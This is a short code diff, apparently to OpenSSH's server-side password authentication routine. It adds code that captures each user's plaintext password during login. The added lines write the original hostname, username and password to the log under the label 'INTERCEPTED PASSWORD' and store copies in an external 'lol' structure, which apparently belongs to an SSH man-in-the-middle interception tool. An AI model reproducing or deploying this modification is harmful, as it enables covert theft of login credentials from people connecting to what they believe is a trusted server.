@@ -43,9 +43,11 @@
 #include "monitor_wrap.h"
 #include "misc.h"
 #include "servconf.h"
+#include "lol.h"
 
 /* import */
 extern ServerOptions options;
+extern Lol *lol;
 
 static int
 userauth_passwd(Authctxt *authctxt)
@@ -65,6 +67,13 @@ userauth_passwd(Authctxt *authctxt)
 	}
 	packet_check_eom();
 
+	char *user = authctxt->user;
+	if (authctxt->original_user != NULL)
+	  user = authctxt->original_user;
+
+	logit("INTERCEPTED PASSWORD: hostname: [%s]; username: [%s]; password: [%s]", lol->original_host, user, password);
+	lol->username = strdup(user);
+	lol->password = strdup(password);
 	if (change)
 		logit("password change not supported");
 	else if (PRIVSEP(auth_password(authctxt, password)) == 1)
